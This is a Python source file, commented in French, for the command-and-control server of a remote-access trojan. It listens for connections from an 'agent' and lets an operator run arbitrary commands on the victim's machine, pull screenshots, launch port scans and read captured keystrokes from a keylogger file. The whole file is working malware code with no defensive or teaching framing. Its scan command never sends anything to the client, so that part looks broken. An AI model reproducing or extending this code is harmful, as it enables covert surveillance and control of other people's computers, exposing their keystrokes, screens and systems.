import socket
import threading

ip_address = '0.0.0.0'
port_number = 1234
keylog_file = "keylog.txt"

def handle_connection(connection, address):
    """
    Gère une connexion client-serveur en permettant d'envoyer des commandes au client et de traiter les réponses reçues.
    """
    print(f"Connexion établie avec {address}")

    help_text = """
        Commandes disponibles:
        - exit : Ferme la connexion avec le client.
        - keylog : Affiche les frappes enregistrées par le keylogger.
        - screenshot : Prend une capture d'écran du client et l'enregistre sous le nom 'screen.png'.
        - scan <start_port> <end_port> : Effectue un scan des ports dans la plage spécifiée.
        - help : Affiche cette aide.
        """

    while True:
        try:
            command = input("Entrer 'help' pour afficher les commandes disponibles ou 'exit' pour quitter : ")

            if command.lower() == 'exit':
                connection.send(b'quit')
                break

            elif command.lower() == 'help':
                print(help_text)
                continue

            elif command.lower() == 'keylog':
                try:
                    with open(keylog_file, "r") as keylog:
                        print(f"Contenu du Keylogger :\n{keylog.read()}")
                except FileNotFoundError:
                    print("Aucun fichier keylog trouvé.")

            elif command.lower() == 'screenshot':
                connection.send(command.encode())
                img_size = int(connection.recv(1024).decode())
                connection.send(b'OK')
                img_data = b''
                while len(img_data) < img_size:
                    packet = connection.recv(4096)
                    if not packet:
                        break
                    img_data += packet

                with open("screen.png", "wb") as f:
                    f.write(img_data)
                print("Capture réussie !")
                continue

            elif command.startswith("scan"):
                print("Scan en cours...")
                response = connection.recv(4096).decode()
                print(f"Résultat du scan :\n{response}")
                continue

            else:
                connection.send(command.encode())

                response = connection.recv(4096).decode()
                if not response:
                    break

                print(f"Output:\n{response}")
        except Exception as e:
            print(f"Error: {e}")
            break

    connection.close()

def start_server():
    """
    Fonction pour établir une connexion avec l'agent.
    """
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip_address, port_number))
    ss.listen(5)
    print(f"Serveur en écoute sur {ip_address}:{port_number}")

    while True:
        connection, address = ss.accept()
        thread = threading.Thread(target=handle_connection, args=(connection, address))
        thread.start()

if __name__ == "__main__":
    start_server()
